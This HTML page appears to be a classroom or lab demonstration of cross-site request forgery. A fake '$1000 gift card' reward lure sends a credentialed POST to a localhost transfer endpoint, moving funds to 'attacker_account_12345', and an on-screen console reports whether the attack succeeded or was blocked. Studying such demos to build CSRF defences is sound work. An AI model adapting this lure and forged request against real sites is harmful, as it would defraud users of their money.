<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üéÅ Exclusive Reward Center</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Poppins', sans-serif;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
    background: linear-gradient(-45deg, #667eea, #764ba2, #6a11cb, #2575fc);
    background-size: 400% 400%;
    animation: gradientMove 12s ease infinite;
}

@keyframes gradientMove {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

.container {
    width: 520px;
    backdrop-filter: blur(20px);
    background: rgba(255, 255, 255, 0.1);
    border-radius: 25px;
    padding: 40px;
    box-shadow: 0 30px 60px rgba(0,0,0,0.3);
    border: 1px solid rgba(255,255,255,0.2);
    color: white;
    animation: fadeIn 1s ease;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(30px); }
    to { opacity: 1; transform: translateY(0); }
}

h1 {
    font-size: 32px;
    font-weight: 700;
    text-align: center;
    margin-bottom: 10px;
}

.subtitle {
    text-align: center;
    font-weight: 300;
    opacity: 0.9;
    margin-bottom: 30px;
}

.gift {
    font-size: 70px;
    text-align: center;
    animation: bounce 2s infinite;
}

@keyframes bounce {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-15px); }
}

.claim-btn {
    width: 100%;
    padding: 15px;
    margin-top: 25px;
    border-radius: 12px;
    border: none;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    background: linear-gradient(135deg, #ff9966, #ff5e62);
    color: white;
    transition: 0.3s;
    box-shadow: 0 10px 25px rgba(0,0,0,0.3);
}

.claim-btn:hover {
    transform: translateY(-3px);
    box-shadow: 0 15px 35px rgba(0,0,0,0.4);
}

.attack-console {
    margin-top: 25px;
    background: rgba(0,0,0,0.7);
    border-radius: 15px;
    padding: 15px;
    height: 200px;
    overflow-y: auto;
    font-family: monospace;
    font-size: 13px;
}

.log-entry {
    margin-bottom: 6px;
}

.info { color: #4dabf7; }
.success { color: #51cf66; }
.error { color: #ff6b6b; }

.warning {
    margin-top: 20px;
    font-size: 12px;
    opacity: 0.8;
    text-align: center;
}
</style>
</head>
<body>

<div class="container">
    <h1>üéâ Exclusive Reward Unlocked!</h1>
    <p class="subtitle">You have been selected for a $1000 Gift Card</p>

    <div class="gift">üéÅ</div>

    <button class="claim-btn" onclick="performCSRFAttack()">
        Claim My Reward Now
    </button>

    <div class="attack-console" id="console"></div>

   
</div>

<script>

const USE_SECURE_ENDPOINTS = false;

const API_BASE = USE_SECURE_ENDPOINTS
    ? 'http://localhost:5000/api/secure/csrf'
    : 'http://localhost:5000/api/attack/csrf';

const consoleDiv = document.getElementById("console");

function log(message, type="info") {
    const entry = document.createElement("div");
    entry.className = "log-entry " + type;
    const time = new Date().toLocaleTimeString();
    entry.textContent = `[${time}] ${message}`;
    consoleDiv.appendChild(entry);
    consoleDiv.scrollTop = consoleDiv.scrollHeight;
}

async function performCSRFAttack() {
    log("üö® Initiating background transaction...", "error");

    try {
        const response = await fetch(`${API_BASE}/transfer`, {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                to: "attacker_account_12345",
                amount: 10000
            })
        });

        const data = await response.json();

        if (data.success) {
            log("‚úÖ Transaction completed successfully", "success");
            log(`üí∞ ‚Çπ${data.amount} transferred`, "success");
            log(`‚ö†Ô∏è Updated Balance: ${data.newBalance}`, "error");
        } else {
            log("üõ°Ô∏è CSRF Protection Active ‚Äî Attack Blocked", "success");
        }

    } catch (err) {
        log("‚ùå Attack failed: " + err.message, "error");
    }
}

window.addEventListener("load", () => {
    log("üåê Malicious reward portal loaded", "info");
});
</script>

</body>
</html>
